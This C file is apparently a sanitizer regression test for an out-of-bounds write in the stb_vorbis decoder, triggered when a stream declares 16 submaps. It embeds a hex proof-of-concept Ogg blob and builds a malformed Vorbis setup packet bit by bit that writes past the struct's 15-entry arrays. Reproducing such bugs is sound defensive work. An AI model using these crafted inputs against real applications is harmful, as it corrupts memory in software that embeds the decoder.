/*
 * BUG-stb_vorbis-004: submap array overflow (16 submaps)
 *
 * The Mapping struct declares:
 *   uint8 submap_floor[15];   // line 758
 *   uint8 submap_residue[15]; // line 759
 *
 * Vorbis spec allows up to 16 submaps (4-bit field, value 0-15, +1 = 1-16).
 * When m->submaps == 16, the loop at line 4117 writes:
 *   m->submap_floor[15]   → overwrites submap_residue[0]
 *   m->submap_residue[15]  → 1 byte past end of struct
 *
 * Detected by UBSan at stb_vorbis.c:4119:10 and :4121:14:
 *   "index 15 out of bounds for type 'uint8[15]'"
 *
 * Compile:
 *   cc -fsanitize=address,undefined -g -I. tests/bug_stb_vorbis_004.c \
 *      -o tests/bug_stb_vorbis_004 -lm
 */

#define STB_VORBIS_IMPLEMENTATION
#define STB_VORBIS_NO_STDIO
#include "stb_vorbis.c"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* BUG-007 poc_ogg for reference */
unsigned char poc_ogg[] = {
    0x4f, 0x67, 0x67, 0x53, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x78, 0x55, 0x5a, 0x12, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x1e, 0x01, 0x76, 0x6f, 0x72, 0x62, 0x69, 0x73, 0x00,
    0x00, 0x00, 0x00, 0x01, 0x44, 0xac, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,
    0x00, 0xf4, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0xb8, 0x01, 0x4f, 0x67,
    0x67, 0x53, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x78, 0x56, 0xbe, 0x12, 0x01, 0x00, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00,
    0x01, 0xff, 0x03, 0x76, 0x6f, 0x72, 0x62, 0x69, 0x73, 0x07, 0x00, 0x00,
    0x00, 0x65, 0x6e, 0x4f, 0x67, 0x7f, 0xff, 0x00, 0x02, 0x00, 0x00, 0x20,
    0xe5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0xe0, 0x17, 0x67, 0xf7,
    0x26, 0x26, 0x97, 0x30, 0x00, 0x00, 0x00, 0x00, 0x24, 0x4a, 0xc0, 0x00,
    0x0f, 0xff, 0xf0, 0x00, 0x00, 0x24, 0x4a, 0xc0, 0x00, 0x04, 0xf6, 0x76,
    0x75, 0x30, 0x00, 0x20, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20,
    0x00, 0x00, 0x00, 0x12, 0x10, 0x57, 0x6f, 0xfe, 0x1e, 0x10, 0x00, 0x00,
    0x11, 0xe0, 0x11, 0xe0, 0x16, 0xe6, 0xf7, 0x26, 0x26, 0x97, 0x30, 0x00,
    0x00, 0x01, 0x00, 0x04, 0x4a, 0xc0, 0x00, 0x0f, 0xff, 0xff, 0xff, 0xf0,
    0x0f, 0x40, 0x10, 0x0f, 0xff, 0xff, 0xff, 0xfb, 0x80, 0x14, 0xf6, 0x77,
    0x35, 0x30, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07,
    0x85, 0x6b, 0xe1, 0x20, 0x10, 0x00, 0x00, 0x00, 0x02, 0x80, 0x00, 0x00,
    0x1f, 0xf0, 0x39, 0x46, 0xf7, 0x26, 0x26, 0x97, 0x30, 0x70, 0x00, 0x00,
    0x06, 0x56, 0xe4, 0xf6, 0x77, 0xff, 0xf0, 0x00, 0x20, 0x00, 0x00, 0x0e,
    0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0xe0, 0x17, 0x66,
    0xf7, 0x26, 0x26, 0x97, 0x30, 0x00, 0x00, 0x00, 0x00, 0x24, 0x4a, 0xc0,
    0x00, 0x0f, 0xff, 0xf0, 0x00, 0x00, 0x24, 0x4a, 0xc0, 0x00, 0x04, 0xf6,
    0x76, 0x75, 0x30, 0x00, 0x20, 0x00, 0x00, 0x00, 0x02, 0x10, 0x17, 0x66,
    0xf7, 0x26, 0x26, 0x97, 0x30, 0x00, 0x00, 0x00, 0x00, 0x14, 0x4a, 0xc0,
    0x00, 0x0f, 0xff, 0xff, 0xff, 0xf0, 0x46, 0x40, 0x10, 0x0f, 0xff, 0xff,
    0xff, 0xf8, 0x60, 0x14, 0xf6, 0x76, 0x75, 0x30, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x04, 0xf6, 0x76, 0x75, 0x30, 0x02, 0x50, 0x00, 0x00,
    0x00, 0x02, 0x10, 0x00, 0x00, 0x00
};
unsigned int poc_ogg_len = 354;

#define WORK_BUF_SIZE 8192

static void w32(unsigned char *p, unsigned int v) {
    p[0] = (unsigned char)(v);
    p[1] = (unsigned char)(v >> 8);
    p[2] = (unsigned char)(v >> 16);
    p[3] = (unsigned char)(v >> 24);
}

typedef struct { unsigned char *buf; int pos, cap; } bitpack;
static void bp_init(bitpack *b, unsigned char *buf, int cap) {
    b->buf = buf; b->pos = 0; b->cap = cap * 8; memset(buf, 0, cap);
}
static void bp_bits(bitpack *b, unsigned int v, int n) {
    for (int i = 0; i < n; i++) {
        if (v & (1u << i)) b->buf[b->pos / 8] |= (1 << (b->pos % 8));
        b->pos++;
    }
    if (b->pos > b->cap) { fprintf(stderr, "Bitpack overflow!\n"); exit(1); }
}
static int bp_bytes(bitpack *b) { return (b->pos + 7) / 8; }

int main() {
    unsigned char work[WORK_BUF_SIZE];
    memset(work, 0, sizeof(work));
    int pos = 0, i;

    printf("BUG-stb_vorbis-004: submap array overflow (16 submaps)\n");

    /* ==================== PAGE 0: Identification ==================== */
    memcpy(work + pos, poc_ogg, 28 + 30);
    pos += 28 + 30;

    /* ==================== PAGE 1: Comment + Setup ==================== */
    int page1_start = pos;

    memcpy(work + pos, "OggS", 4); pos += 4;
    work[pos++] = 0;
    work[pos++] = 0;
    w32(work + pos, 0); pos += 4;
    w32(work + pos, 0); pos += 4;
    w32(work + pos, 0x12be5678); pos += 4;
    w32(work + pos, 1); pos += 4;
    w32(work + pos, 0); pos += 4;

    int seg_count_pos = pos;
    pos++;
    int seg_table_pos = pos;
    int nsegs = 2;
    int data_start = seg_table_pos + nsegs;
    pos = data_start;

    /* Comment packet */
    int comment_start = pos;
    work[pos++] = 3;
    memcpy(work + pos, "vorbis", 6); pos += 6;
    w32(work + pos, 0); pos += 4;
    w32(work + pos, 0); pos += 4;
    work[pos++] = 1;
    int comment_len = pos - comment_start;

    /* Setup packet with 16-submap mapping */
    unsigned char setup[1024];
    bitpack b;
    bp_init(&b, setup, sizeof(setup));

    setup[0] = 5;
    memcpy(setup + 1, "vorbis", 6);
    b.pos = 56;

    bp_bits(&b, 1, 8);     /* codebook_count = 1 */
    bp_bits(&b, 0x42, 8);
    bp_bits(&b, 0x43, 8);
    bp_bits(&b, 0x56, 8);
    bp_bits(&b, 1, 8);
    bp_bits(&b, 0, 8);
    bp_bits(&b, 1, 8);
    bp_bits(&b, 0, 8);
    bp_bits(&b, 0, 8);
    bp_bits(&b, 0, 1);     /* non-ordered */
    bp_bits(&b, 0, 1);     /* nonsparse */
    bp_bits(&b, 0, 5);     /* length[0] = 1 */
    bp_bits(&b, 0, 4);     /* lookup_type = 0 */

    bp_bits(&b, 0, 6);     /* time_count = 1 */
    bp_bits(&b, 0, 16);
    bp_bits(&b, 0, 6);     /* floor_count = 1 */
    bp_bits(&b, 1, 16);    /* floor_types[0] = 1 */
    bp_bits(&b, 0, 5);
    bp_bits(&b, 0, 2);
    bp_bits(&b, 0, 4);
    bp_bits(&b, 0, 6);     /* residue_count = 1 */
    bp_bits(&b, 0, 16);
    bp_bits(&b, 0, 24);
    bp_bits(&b, 1, 24);
    bp_bits(&b, 0, 24);
    bp_bits(&b, 0, 6);
    bp_bits(&b, 0, 8);
    bp_bits(&b, 0, 3);
    bp_bits(&b, 0, 1);

    /* Mapping: 16 submaps */
    bp_bits(&b, 0, 6);     /* mapping_count = 1 */
    bp_bits(&b, 0, 16);    /* mapping_type = 0 */
    bp_bits(&b, 1, 1);     /* submaps_flag */
    bp_bits(&b, 15, 4);    /* submaps = 16 */
    bp_bits(&b, 0, 1);     /* coupling_steps = 0 */
    bp_bits(&b, 0, 2);     /* reserved */
    bp_bits(&b, 0, 4);     /* chan[0].mux = 0 */

    for (i = 0; i < 16; i++) {
        bp_bits(&b, 0, 8);
        bp_bits(&b, 0, 8);
        bp_bits(&b, 0, 8);
    }

    bp_bits(&b, 0, 6);
    bp_bits(&b, 0, 1);
    bp_bits(&b, 0, 16);
    bp_bits(&b, 0, 16);
    bp_bits(&b, 0, 8);
    bp_bits(&b, 1, 1);

    int setup_bytes = bp_bytes(&b);
    memcpy(work + pos, setup, setup_bytes);
    pos += setup_bytes;

    work[seg_table_pos + 0] = (unsigned char)comment_len;
    work[seg_table_pos + 1] = (unsigned char)setup_bytes;
    work[seg_count_pos] = 2;
    int total_data = comment_len + setup_bytes;
    int page1_total = 27 + 1 + nsegs + total_data;
    pos = page1_start + page1_total;

    printf("Opening with stb_vorbis_open_memory (16 submaps)...\n");

    int error;
    stb_vorbis *v = stb_vorbis_open_memory(work, pos, &error, NULL);

    if (v) {
        printf("Decoder opened. No sanitizer error.\n");
        stb_vorbis_close(v);
    } else {
        printf("Decoder returned error %d\n", error);
    }

    printf("OK\n");
    return 0;
}
